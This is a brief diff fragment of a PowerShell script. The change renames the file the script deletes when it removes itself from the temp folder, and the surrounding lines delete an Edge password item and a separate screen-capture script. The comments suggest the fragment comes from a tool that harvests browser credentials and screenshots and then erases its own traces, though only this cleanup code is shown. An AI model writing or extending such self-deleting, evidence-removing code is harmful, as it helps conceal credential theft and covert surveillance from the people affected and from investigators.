@@ -155,7 +155,7 @@ cd $env:temp
 # Delete Edge password
   Remove-Item  $edgepassword -Force -Recurse;
 # Delete this script
-  Remove-Item  $env:temp\e.ps1 -Force -Recurse;
+  Remove-Item  $env:temp\simGA.ps1 -Force -Recurse;
 # Delete screencapture script
   Remove-Item $env:temp\d.ps1 -Force -Recurse;
 
